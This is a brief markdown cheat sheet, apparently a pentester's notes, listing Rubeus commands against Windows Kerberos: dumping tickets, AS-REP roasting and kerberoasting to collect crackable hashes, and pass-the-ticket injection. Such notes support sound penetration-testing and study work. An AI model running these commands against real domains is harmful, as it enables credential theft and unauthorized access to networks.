# Rubeus
toolset for raw Kerberos interactions and abuses.
[HackTrix - Extracting tickets from Windows](https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows)

## Harvest tickets from Windows
As a **non-administrative user only owned tickets can be fetched**, however, as machine **administrator**, **all** of them can be harvested.
```powershell
PS> .\Rubeus dump
```

## asreproast
run on host in domain
```powershell
# perform attack as a pre-authenticated (logged in) user on host in domain
# identyfy users voulnerable for ASREProast and get their AR-REP hash
PS> .\Rubeus.exe asreproast /nowrap [/outfile:hashes.kerberoast]
# copy asrephash and crack it
```
## kerberoast
execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.
```powershell
# locate all users voulnerable for kerberoasting and get TGT
PS> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
## pass-the-ticket
```powershell
# inject ticket to memmory
.\Rubeus.exe ptt /ticket:$ticket_kirbi_file
```
-